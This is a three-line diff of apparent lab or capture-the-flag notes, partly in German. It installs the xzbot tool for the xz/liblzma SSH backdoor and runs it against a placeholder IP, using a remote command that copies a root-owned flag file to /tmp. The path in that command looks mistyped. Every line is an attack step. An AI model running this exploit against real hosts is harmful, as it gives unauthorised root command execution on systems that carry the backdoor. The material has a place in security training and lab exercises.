@@ -1,0 +1,3 @@
+go install github.com/amlweems/xzbot@latest
+dann in ~/go/bin/
+./xzbot -addr IP -seed "1bis50" -cmd "cat /rot/root.tx > /tmp/root.txt"
